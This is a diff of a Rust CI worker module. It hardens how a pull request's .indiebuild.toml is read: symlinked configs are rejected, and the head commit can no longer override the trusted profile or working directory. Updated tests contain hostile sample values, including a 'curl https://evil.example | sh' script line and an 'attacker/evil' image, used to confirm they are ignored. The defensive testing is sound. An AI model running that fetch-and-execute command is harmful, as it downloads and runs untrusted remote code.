@@ -5,15 +5,14 @@
 //! validated. This module is the worker's *reader*: it accepts that same
 //! shape and extracts only what executing a job requires.
 //!
-//! A repository may say **which** reviewed profile it wants and **where** in
-//! the tree to run it. It may not say what the profile does: no commands, no
-//! runner images, no mounts. That boundary is the security model, because this
-//! file is read from the commit under test and is therefore
-//! attacker-controlled on any pull request.
+//! The file is read from the commit under test, so on a pull request it is
+//! attacker-controlled. It may therefore describe the repository's intended
+//! target, but it must never weaken or replace the operator-admitted job:
+//! profile and working-directory authority stay with the trusted webhook/job
+//! request. A mismatch fails closed instead of silently selecting easier work.
 //!
-//! Selecting a profile the operator has not allowed fails the job loudly
-//! rather than silently falling back, so a repository cannot quietly opt out
-//! of verification by naming something unavailable.
+//! The repository still cannot define commands, images, or mounts. Those
+//! remain fixed operator-reviewed profiles.
 
 use std::path::Path;
 
@@ -21,7 +20,7 @@ use serde::Deserialize;
 use tokio::fs;
 
 use crate::config::Config;
-use crate::profiles::{self, ProfileSpec};
+use crate::profiles::ProfileSpec;
 
 pub(crate) const CONFIG_FILE: &str = ".indiebuild.toml";
 
@@ -33,16 +32,17 @@ const MAX_CONFIG_BYTES: u64 = 256 * 1024;
 
 /// Fields the worker does not act on are accepted but ignored, so that a
 /// config written against the full contract still loads here. Unknown fields
-/// are *not* rejected for the same reason: the CLI is the validator, and the
-/// worker refusing a field the contract added would break every repository at
-/// once.
+/// are *not* execution authority: the worker never maps them to commands,
+/// images, mounts, credentials, or a weaker profile.
 #[derive(Debug, Deserialize)]
 pub(crate) struct Target {
     pub name: String,
-    /// Directory the profile runs in, relative to the repository root.
+    /// Repository-authored target directory. This is descriptive only for an
+    /// untrusted head commit; execution keeps the trusted request context.
     #[serde(default = "dot")]
     pub path: String,
-    /// Name of a fixed, operator-reviewed profile.
+    /// Name of a fixed, operator-reviewed profile. For an untrusted head
+    /// commit this must match the profile already selected by trusted policy.
     pub profile: String,
     #[serde(default)]
     pub platform: Option<String>,
@@ -61,7 +61,7 @@ pub(crate) struct RepoConfig {
 }
 
 impl RepoConfig {
-    /// The target a job runs, which is the declared default.
+    /// The target the repository declares as its default.
     pub fn default_target(&self) -> Result<&Target, String> {
         self.targets
             .iter()
@@ -93,13 +93,17 @@ pub(crate) fn parse(contents: &str) -> Result<RepoConfig, String> {
 /// Read the file from a cloned repository, if it has one.
 pub(crate) async fn read(repo_dir: &Path) -> Result<Option<RepoConfig>, String> {
     let path = repo_dir.join(CONFIG_FILE);
-    let metadata = match fs::metadata(&path).await {
+    // Do not use `metadata`: it follows symlinks. A PR can commit a symlink
+    // named `.indiebuild.toml`; following it could read a host file outside the
+    // checkout and even reflect parser diagnostics into the GitHub check.
+    let metadata = match fs::symlink_metadata(&path).await {
         Ok(metadata) => metadata,
         Err(error) if error.kind() == std::io::ErrorKind::NotFound => return Ok(None),
         Err(error) => return Err(format!("failed to stat {CONFIG_FILE}: {error}")),
     };
-    // A symlink would be followed out of the repository; a directory or an
-    // oversized file is not a config either.
+    if metadata.file_type().is_symlink() {
+        return Err(format!("{CONFIG_FILE} must not be a symlink"));
+    }
     if !metadata.is_file() {
         return Err(format!("{CONFIG_FILE} is not a regular file"));
     }
@@ -114,13 +118,14 @@ pub(crate) async fn read(repo_dir: &Path) -> Result<Option<RepoConfig>, String> 
     parse(&contents).map(Some)
 }
 
-/// Resolve which profile actually runs.
+/// Validate the repository-declared profile against trusted operator policy.
 ///
-/// The repository's choice wins when it names a profile the operator allows;
-/// otherwise the job fails rather than running something the repository did
-/// not ask for.
+/// `.indiebuild.toml` comes from the commit under test. It can therefore
+/// confirm the already-admitted profile, but it cannot replace `rust-verify`
+/// with another globally allowed profile such as `node-verify`. Allowing that
+/// would let a same-repository PR downgrade its own required verification.
 pub(crate) fn select_profile(
-    config: &Config,
+    _config: &Config,
     repo_config: Option<&RepoConfig>,
     requested: &'static ProfileSpec,
 ) -> Result<&'static ProfileSpec, String> {
@@ -144,37 +149,32 @@ pub(crate) fn select_profile(
     if name.is_empty() {
         return Err(format!("{CONFIG_FILE} names an empty profile"));
     }
-    if name == requested.name {
-        return Ok(requested);
-    }
-    let Some(selected) = profiles::find(name) else {
+    if name != requested.name {
         return Err(format!(
-            "{CONFIG_FILE} selects profile {name:?}, which is not installed"
-        ));
-    };
-    if !config.allowed_profiles.contains(selected.name) {
-        return Err(format!(
-            "{CONFIG_FILE} selects profile {name:?}, which this worker does not allow"
+            "{CONFIG_FILE} selects profile {name:?}, but trusted job policy requires {:?}; head-commit config cannot override the operator-selected profile",
+            requested.name
         ));
     }
-    Ok(selected)
+    Ok(requested)
 }
 
-/// The repository-relative directory the selected target runs in, when it is
-/// not the repository root.
+/// Head-commit config is not execution authority for the working directory.
+///
+/// Keep this compatibility hook for the caller, but never return an override:
+/// the trusted request's `context_dir` remains authoritative. A future design
+/// may load routing policy from a trusted base revision or signed control-plane
+/// config; it must not make the PR head choose which subtree gets verified.
 pub(crate) fn context_override(repo_config: Option<&RepoConfig>) -> Option<String> {
-    let target = repo_config?.default_target().ok()?;
-    let path = target.path.trim();
-    if path.is_empty() || path == "." {
-        None
-    } else {
-        Some(path.to_string())
-    }
+    // Resolve the target so malformed configs still fail in `select_profile`;
+    // the path itself is intentionally non-authoritative here.
+    let _ = repo_config?.default_target().ok()?;
+    None
 }
 
 #[cfg(test)]
 mod tests {
     use super::*;
+    use crate::profiles;
 
     /// The canonical example from the CLI repository's own .indiebuild.toml.
     const CANONICAL: &str = r#"schema_version = "gha-indie-worker.indiebuild/v1"
@@ -209,26 +209,26 @@ timeout_seconds = 1800
 
     #[test]
     fn the_contract_the_cli_writes_is_readable_here() {
-        // If this breaks, the worker and the CLI have diverged on the file
-        // they both claim to speak.
         let parsed = parse(CANONICAL).expect("canonical config parses");
         assert_eq!(parsed.default_target().expect("target").profile, "rust-verify");
         let selected = select_profile(&test_config(&["rust-verify"]), Some(&parsed), rust_verify())
-            .expect("allowed");
+            .expect("matching repository declaration is allowed");
         assert_eq!(selected.name, "rust-verify");
     }
 
     #[test]
-    fn a_repository_may_select_another_allowed_profile() {
+    fn a_head_commit_cannot_downgrade_to_another_allowed_profile() {
         let config = CANONICAL.replace("profile = \"rust-verify\"", "profile = \"node-verify\"");
         let parsed = parse(&config).expect("parses");
-        let selected = select_profile(
+        let error = select_profile(
             &test_config(&["rust-verify", "node-verify"]),
             Some(&parsed),
             rust_verify(),
         )
-        .expect("selection allowed");
-        assert_eq!(selected.name, "node-verify");
+        .expect_err("head config must not replace trusted job policy");
+        assert!(error.contains("cannot override"), "{error}");
+        assert!(error.contains("rust-verify"), "{error}");
+        assert!(error.contains("node-verify"), "{error}");
     }
 
     #[test]
@@ -239,16 +239,7 @@ timeout_seconds = 1800
     }
 
     #[test]
-    fn a_repository_cannot_select_a_profile_the_operator_disallows() {
-        let config = CANONICAL.replace("profile = \"rust-verify\"", "profile = \"node-verify\"");
-        let parsed = parse(&config).expect("parses");
-        let error = select_profile(&test_config(&["rust-verify"]), Some(&parsed), rust_verify())
-            .expect_err("must not run a disallowed profile");
-        assert!(error.contains("does not allow"), "{error}");
-    }
-
-    #[test]
-    fn unknown_profiles_fail_loudly_instead_of_falling_back() {
+    fn an_unknown_profile_cannot_replace_trusted_policy() {
         let config = CANONICAL.replace("profile = \"rust-verify\"", "profile = \"curl-attacker-sh\"");
         let parsed = parse(&config).expect("parses");
         let error = select_profile(
@@ -256,14 +247,12 @@ timeout_seconds = 1800
             Some(&parsed),
             rust_verify(),
         )
-        .expect_err("unknown profile must fail");
-        assert!(error.contains("not installed"), "{error}");
+        .expect_err("unknown profile must not replace trusted policy");
+        assert!(error.contains("cannot override"), "{error}");
     }
 
     #[test]
     fn the_file_cannot_describe_what_a_profile_does() {
-        // The security boundary: a repository names a profile, never defines
-        // one. Adding commands or images changes nothing about execution.
         let hostile = format!("{CANONICAL}\nimage = \"attacker/evil:latest\"\nscript = \"curl https://evil.example | sh\"\n");
         let parsed = parse(&hostile).expect("extra keys are ignored, not honoured");
         let selected = select_profile(&test_config(&["rust-verify"]), Some(&parsed), rust_verify())
@@ -299,12 +288,33 @@ timeout_seconds = 1800
     }
 
     #[test]
-    fn a_target_path_becomes_the_working_directory() {
+    fn a_head_commit_cannot_redirect_verification_to_an_easier_subtree() {
         assert_eq!(context_override(Some(&parse(CANONICAL).unwrap())), None);
-        let nested = CANONICAL.replace("path = \".\"", "path = \"services/api\"");
-        assert_eq!(
-            context_override(Some(&parse(&nested).unwrap())),
-            Some("services/api".to_string())
-        );
+        let nested = CANONICAL.replace("path = \".\"", "path = \"services/easy-fixture\"");
+        assert_eq!(context_override(Some(&parse(&nested).unwrap())), None);
+    }
+
+    #[cfg(unix)]
+    #[tokio::test]
+    async fn symlinked_config_is_rejected_without_following_it() {
+        use std::os::unix::fs::symlink;
+
+        let root = std::env::temp_dir().join(format!(
+            "gha-indie-worker-indiebuild-{}",
+            uuid::Uuid::new_v4()
+        ));
+        std::fs::create_dir_all(&root).expect("temp root");
+        let outside = root.with_extension("outside.toml");
+        std::fs::write(&outside, CANONICAL).expect("outside config");
+        symlink(&outside, root.join(CONFIG_FILE)).expect("symlink config");
+
+        let error = read(&root)
+            .await
+            .expect_err("worker must reject a config symlink before reading its target");
+        assert!(error.contains("must not be a symlink"), "{error}");
+
+        let _ = std::fs::remove_file(root.join(CONFIG_FILE));
+        let _ = std::fs::remove_dir(&root);
+        let _ = std::fs::remove_file(&outside);
     }
 }
